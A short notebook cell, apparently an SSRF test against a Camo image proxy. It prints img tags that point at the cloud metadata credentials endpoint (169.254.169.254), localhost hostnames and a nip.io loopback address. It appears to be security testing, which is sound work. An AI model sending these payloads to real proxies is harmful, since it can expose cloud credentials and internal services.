# %%
# Camo proxy SSRF test
# Out:
# <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1" height="1">
# <img src="http://github.localhost/" width="1" height="1">
# <img src="http://notebooks.localhost:8888/" width="1" height="1">
# <img src="http://127.0.0.1.nip.io:8080/" width="1" height="1">
